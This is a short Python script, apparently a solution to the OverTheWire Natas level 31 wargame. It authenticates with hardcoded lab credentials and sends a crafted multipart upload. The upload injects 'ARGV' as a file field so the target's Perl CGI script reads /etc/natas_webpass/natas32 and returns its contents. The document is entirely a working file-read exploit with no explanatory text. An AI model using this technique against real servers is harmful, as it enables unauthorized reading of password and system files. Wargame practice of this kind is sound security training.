import requests 

url = "http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32"
creds = ("natas31","m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y")

session = requests.Session()
session.auth = creds

files = [
    ('file',(None, 'ARGV')),                # (field name, (filename, value))
    ('file',('file.csv','alice,bob,charles,dick,eve')),
    ('submit',(None,'Upload'))
]

response = session.post(url, files = files)

print(response.text)